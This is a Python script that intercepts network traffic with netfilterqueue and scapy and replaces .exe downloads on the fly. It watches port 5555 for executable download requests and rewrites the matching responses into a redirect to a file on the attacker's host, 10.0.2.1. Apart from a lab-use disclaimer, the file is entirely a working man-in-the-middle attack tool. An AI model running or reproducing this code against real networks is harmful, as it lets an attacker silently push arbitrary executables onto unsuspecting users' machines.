#!/usr/bin/env python

# Just a simple https replace downloads on the fly program
# wiritten by Jace Winters
# Please only use this program  on your lab testing environment or network you have explicit permission to test.
# I will  not be held responsible for any misuse of my code by any individual or country

import netfilterqueue
import scapy.all as scapy


ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 5555:
            # print("HTTP Request")
            if ".exe" in scapy_packet[scapy.Raw].load and "10.0.2.1" not in scapy_packet[scapy.Raw].load:
                print("[+] Download Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                # print(scapy_packet.show())  # Then put any code in this line to replace the downloads

        elif scapy_packet[scapy.TCP].sport == 5555:
            # print("HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                # ack_list.remove(scapy_packet[scapy.TCP].seq in ack_list) line commented out as it was giving out an exception error.
                print("[+] Replacing File")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.1/test_files/macchanger.exe\n\n")

                packet.set_payload(str(modified_packet))
                # print(scapy_packet.show())  # Then put any code in this line to replace the downloads ^

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
